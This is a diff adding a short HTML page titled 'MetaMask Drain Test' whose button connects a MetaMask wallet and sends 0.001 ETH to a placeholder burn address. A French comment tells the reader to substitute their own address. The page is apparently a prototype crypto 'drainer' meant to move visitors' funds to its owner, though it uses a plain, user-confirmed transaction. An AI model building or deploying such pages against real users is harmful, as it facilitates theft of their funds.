@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>MetaMask Drain Test</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 16px;
+      background: #ff6600;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <button onclick="startDrain()">🚨 Connect & Send ETH</button>
+
+  <script>
+    async function startDrain() {
+      if (typeof window.ethereum === 'undefined') {
+        alert("MetaMask non détecté. Ouvre Firefox et installe MetaMask.");
+        return;
+      }
+
+      try {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const address = await signer.getAddress();
+        console.log("Connecté à:", address);
+
+        const tx = {
+          to: "0x000000000000000000000000000000000000dead", // remplace par ton adresse
+          value: ethers.utils.parseEther("0.001")
+        };
+
+        const res = await signer.sendTransaction(tx);
+        console.log("Transaction envoyée:", res.hash);
+        alert("Transaction envoyée: " + res.hash);
+      } catch (error) {
+        console.error("Erreur:", error);
+        alert("Transaction annulée ou erreur.");
+      }
+    }
+  </script>
+</body>
+</html>
